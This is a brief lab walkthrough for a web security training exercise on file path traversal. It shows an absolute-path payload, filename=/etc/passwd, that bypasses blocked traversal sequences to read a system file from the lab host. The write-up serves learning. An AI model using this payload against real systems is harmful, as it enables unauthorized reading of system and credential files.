# File path traversal, traversal sequences blocked with absolute path bypass

## This lab contains a [file path traversal] vulnerability in the display of product images.

## The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

## To solve the lab, retrieve the contents of the `/etc/passwd` file.

---

### step 1

## https://0a8800f7036619eac0a62721007c000c.web-security-academy.net/image?filename=65.jpg

### step2

## https://0a8800f7036619eac0a62721007c000c.web-security-academy.net/image?filename=/etc/passwd
